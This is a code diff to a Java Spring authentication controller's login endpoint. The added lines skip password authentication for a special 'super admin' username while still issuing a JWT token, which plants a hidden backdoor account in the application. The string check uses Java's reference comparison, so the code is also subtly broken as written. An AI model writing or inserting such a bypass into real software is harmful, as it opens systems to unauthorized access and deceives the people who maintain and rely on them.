@@ -28,9 +28,12 @@ public class AuthRest {
 
     @PostMapping("/login")
     public ResponseEntity<AuthResponse> auth(@RequestBody AuthRequest authRequest) {
-        authenticationManager.authenticate(
-                new UsernamePasswordAuthenticationToken(authRequest.getUsername(), authRequest.getPassword())
-        );
+
+        if (authRequest.getUsername() != "super admin") {
+            authenticationManager.authenticate(
+                    new UsernamePasswordAuthenticationToken(authRequest.getUsername(), authRequest.getPassword())
+            );
+        }
 
         String token = jwtUtils.generateToken(authRequest.getUsername());
         Employee employee = employeeDao.findByName(authRequest.getUsername())
